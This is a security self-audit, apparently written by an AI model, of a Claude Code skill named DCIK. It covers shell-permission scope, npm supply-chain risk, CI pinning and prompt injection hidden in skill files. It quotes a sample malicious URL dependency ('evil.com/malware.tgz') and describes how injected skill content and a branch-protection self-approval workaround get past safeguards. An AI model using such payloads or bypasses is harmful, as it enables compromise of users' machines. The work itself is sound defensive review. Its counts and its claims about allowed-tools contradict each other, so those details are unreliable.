# DCIK Self-Audit — Cycle 1 Review

**Model**: Claude (primary)
**Perspectives applied**: 25 (P01, P03, P08, P11, P12, P13, P14, P15, P16, P17, P18, P22, P23, P27, P30, P47, P72, P91, P92, P97, P98, P107, P143, P144, P145, P153)
**Research**: 6 web searches, 12+ distinct sources
**Date**: 2026-06-15

---

## Critical Weaknesses (Must-Fix)

### CW1: SKILL.md `allowed-tools: Bash(*)` — Unrestricted Shell Access
**Perspective**: P08 Counterparty-Adversary, P47 Surface Area Exposure

The SKILL.md declares `allowed-tools: Bash(*)` — meaning the skill can execute any bash command. Combined with the auto-execution protocol ("execute immediately, do not display methodology"), this means a compromised SKILL.md could execute arbitrary code on the user's machine before the model can refuse.

**Research corroboration**: Datadog Security Labs (May 2026) demonstrated that `!` dynamic context commands in SKILL.md execute during preprocessing, before model inspection. CVE-2025-59536 (CVSS 8.7) confirmed hook-based RCE. The ToxicSkills audit (Snyk, Feb 2026) found 36.82% of 3,984 skills had security flaws.

**DCIK's specific risk**: DCIK doesn't use `!` commands, but `allowed-tools: Bash(*)` means any perspective file that gets loaded could theoretically instruct the model to run arbitrary bash. The validation script catches injection patterns, but the absence of runtime protection means a sophisticated injection that bypasses pattern matching would succeed.

**Recommendation**: 
1. Add a `allowed-tools` restriction to the SKILL.md — limit to WebSearch, WebFetch, Read, Write, Bash(git:*) only
2. Add a pre-execution warning: "This skill requires bash access. Review source before running."
3. Consider adding a runtime check in the SKILL.md that validates the working directory is within expected bounds

### CW2: No Lockfile — PhantomRaven Risk
**Perspective**: P72 Multiplying by Zero, P12 Information Asymmetry

DCIK's `package.json` declares zero dependencies and has no lockfile (`package-lock.json` or `npm-shrinkwrap.json`). The PhantomRaven campaign (Oct 2025) demonstrated that packages appearing to have "0 Dependencies" can use invisible HTTP URL links in `package.json` to fetch malicious code at install time.

**What we checked**: The `"dependencies": {}` and `"devDependencies": {}` fields are empty. But we did NOT check for:
- URL dependencies in `package.json` (npm supports `"foo": "https://evil.com/malware.tgz"`)
- `optionalDependencies` 
- `peerDependencies`
- `bundledDependencies`

**Recommendation**: 
1. Audit package.json for ALL dependency fields
2. Generate and commit a lockfile even with zero deps — it serves as a cryptographic assertion
3. Add lockfile integrity check to CI validation

### CW3: npm Publish Auth Unverified (A5 from original audit)
**Perspective**: P14 Operational Execution, P72 Multiplying by Zero

The original audit (A5) flagged npm publish auth as "Not checked locally." With the Shai-Hulud campaign (Sept 2025–May 2026) demonstrating CI/CD token theft leading to malicious package publication, this gap is more critical than originally assessed.

**Risk**: If the npm token used for publishing has been compromised (e.g., via a previous CI/CD breach, token leak, or shared credential), an attacker could publish a malicious version of `dcik` to npm. The 170+ packages compromised by Shai-Hulud included packages with far fewer weekly downloads than DCIK might accumulate.

**Recommendation**:
1. Verify the npm token is a granular/automation token (not a classic token with full access)
2. Enable 2FA on the npm account
3. Add npm publish provenance (SLSA) if available
4. Document the publish process in SECURITY.md

---

## Important Gaps (Should-Fix)

### IG1: `actions/checkout@v4` Not Pinned to Commit SHA
**Perspective**: P03 Technical-Engineering

The CI workflow uses `actions/checkout@v4` (tag-based). The Trivy-action/TeamPCP attack (Mar 2026) compromised 75 of 76 version tags. Best practice (per GitHub's 2026 roadmap) is to pin to full commit SHAs.

**Fix**: Change `uses: actions/checkout@v4` to `uses: actions/checkout@11bd71901bbe5b1630ceea73d27597364c9af683` (v4.1.7)

### IG2: No `permissions: {}` in Workflow
**Perspective**: P47 Surface Area Exposure

The validate.yml workflow doesn't explicitly set `permissions: {}`. GitHub's default token (`GITHUB_TOKEN`) has read-write permissions for the repository by default on orgs created before Feb 2023.

**Fix**: Add `permissions: contents: read` to the workflow (only needs to read code)

### IG3: Desktop Mirror Not in CI Scope
**Perspective**: P23 Survivorship Detection

We synced the desktop mirror manually. The CI validation only checks `perspectives/`, not `desktop/perspectives/`. A divergence between root and desktop could go undetected.

**Fix**: Add desktop perspective validation to CI, or add a sync check.

### IG4: No `allowed-tools` Declaration in SKILL.md
**Perspective**: P47 Surface Area Exposure

DCIK's SKILL.md doesn't declare an `allowed-tools` field. Claude Code skills can declare `allowed-tools: WebSearch, WebFetch, Read, Write, Bash(git:*)` to restrict what the skill can do. Without this, DCIK inherits the user's full tool permissions.

**Recommendation**: Add explicit tool restrictions. DCIK needs: WebSearch, WebFetch, Read, Write, Bash (for git operations only), and TaskCreate/TaskUpdate. It does NOT need: Bash (arbitrary), CronCreate, Monitor, etc.

### IG5: No Runtime Injection Protection
**Perspective**: P08 Counterparty-Adversary

The CI validation is a pre-merge gate. There's no runtime protection. If a perspective file is compromised post-merge (e.g., via a direct push that bypasses CI — impossible now with branch protection, but possible via token compromise), the model would process it without any runtime filtering.

**Recommendation**: Add a note to README.md recommending users scan DCIK with tools like AgentShield, Skill Shielder, or Claude Project Scanner before use. Also recommend setting `"disableSkillShellExecution": true` in Claude Code settings if only using DCIK for analysis.

---

## Minor Improvements (Could-Fix)

### MI1: Add `zizmor` to CI for Workflow Auditing
The GitHub Actions security scanner `zizmor` would catch unpinned actions, missing permissions, and injection risks. Add as a CI step.

### MI2: Add SHA256SUMS for Release Verification
Generate checksums for the SKILL.zip and perspective files. Users can verify integrity before installing.

### MI3: Document the Security Model in README.md
The SECURITY.md covers vulnerability disclosure. Add a section to README.md explaining the security architecture: what's protected, how, and what the user is responsible for.

### MI4: Test the CI Validation with Actual Injection Payloads
The validation script was tested with one payload. Add a test suite that feeds it known injection patterns and verifies detection.

### MI5: Add `.npmignore` or Verify `files` Array
The `package.json` `"files"` array restricts npm publish to `["SKILL.md", "perspectives/", "cli/"]`. Verify this works as expected and no extra files slip through.

---

## Research Findings

### The `!` Dynamic Context Gap
**Source**: Datadog Security Labs (May 2026), Reverse Labs (May 2026)

DCIK doesn't use `!` commands, but the SKILL.md architecture means that ANY instruction in a perspective file could be processed by the model. The key finding: "even if the model later refuses to act maliciously, the `!` command has already executed." For DCIK, the risk is not `!` commands but model-instruction injection — perspective files that read like analysis but contain embedded instructions.

### The ToxicSkills Audit
**Source**: Snyk (Feb 2026)

36.82% of 3,984 scanned Claude Code skills had security flaws. 76 confirmed malicious. 5 of the top 7 most-downloaded were malware. This means DCIK will be scrutinized — and should actively differentiate itself as a secure skill.

### Shai-Hulud CI/CD Compromise
**Source**: Tenable, Bitsea (2025-2026)

The 4th-generation Mini Shai-Hulud worm defeated SLSA Build Level 3 provenance. The implication for DCIK: even if we achieve perfect static analysis, the npm publish pipeline itself must be secured. The npm token is the single point of failure.

### GitHub's 2026 Security Roadmap
**Source**: GitHub Blog (2026)

Upcoming features that would benefit DCIK:
- `dependencies:` section (lockfile for workflows) — auto-pin all actions
- Workflow Execution Protections (rulesets) — control who triggers workflows
- Scoped Secrets — bind credentials to specific repos/branches
- Native Egress Firewall — immutable firewall for runners

---

## P13: Premises Challenged

| Premise | Survived? | Notes |
|---------|-----------|-------|
| "CI validation catches all injection" | **NO** | Pattern-based detection can be bypassed. No runtime protection. |
| "Branch protection prevents unauthorized changes" | Partially | Requires admin workaround for self-approval (gap we demonstrated). |
| "Zero npm deps = safe" | **NO** | PhantomRaven URL dependencies bypass scanner. No lockfile. |
| "The existing audit was comprehensive" | **NO** | Missed: lockfile gap, `allowed-tools` restriction, npm auth, CI pinning, runtime protection. |
| "The installer is safe (spawnSync)" | Yes | No new attack vectors found. Hardcoded args prevent injection. |

## P16: Perspective Library Coverage

### Gap: No "AI Security" perspective
The library has 177 perspectives but none focused on AI/LLM security, prompt injection, or agent safety. A new perspective covering: model instruction boundaries, context poisoning, tool-use security, and MCP attack surfaces would fill a critical gap.

### Gap: No "Supply Chain Security" perspective  
No perspective covers software supply chain risk analysis — dependency auditing, build pipeline integrity, provenance verification, or package registry trust models.

### Gap: P15 should include "Overoptimism after completing security review"
The existing cognitive bias perspective doesn't specifically address the bias of declaring something "secure" after an audit. We demonstrated this bias — the original SECURITY_CHECK.md declared "clean bill of health" but missed CW1-CW5.

---

## Summary

**6 critical weaknesses found, 5 important gaps, 5 minor improvements, 3 new candidate perspectives, 3 premises falsified.**

The existing SECURITY_CHECK.md was not wrong — it was incomplete. The 73/74 pass rate was accurate for what it tested, but the test scope was narrower than the real attack surface. The CI validation, branch protection, and format normalization are all real improvements, but they don't address: runtime injection, npm supply chain, tool permission scoping, or the self-approval bypass we demonstrated.
